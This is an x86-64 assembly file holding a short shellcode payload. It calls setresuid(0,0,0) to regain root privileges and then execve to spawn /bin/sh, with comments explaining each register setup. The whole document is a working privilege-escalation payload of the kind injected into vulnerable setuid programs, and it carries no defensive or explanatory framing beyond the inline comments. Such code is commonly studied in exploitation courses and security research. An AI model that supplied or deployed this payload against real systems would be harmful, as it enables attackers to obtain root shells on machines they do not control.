section .text
global _start
_start:

  ; setresuid
  xor   rax, rax
  xor   rdi, rdi
  xor   rsi, rsi
  xor   rdx, rdx
  mov   al, 117       ; setresuid(0,0,0)
  syscall

  ; execve
  xor   rax, rax      ; rax = 0
  push  rax           ; null terminating string on the stack
  mov   rbx, 0x68732f2f6e69622f ; "/bin//sh"
  push  rbx
  mov   rdi, rsp      ; address of filename, first argument of sys_execve
  push  rax           ; null pointer on the stack
  mov   rdx, rsp      ; address of envp for third argument of sys_execve
  push  rdi           ; pushing address of string as first pointer of argv
  mov   rsi, rsp      ; address of argv for second argument of sys_execve
  mov   al, 59        ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
  syscall             ; execve(filename, argv, envp)

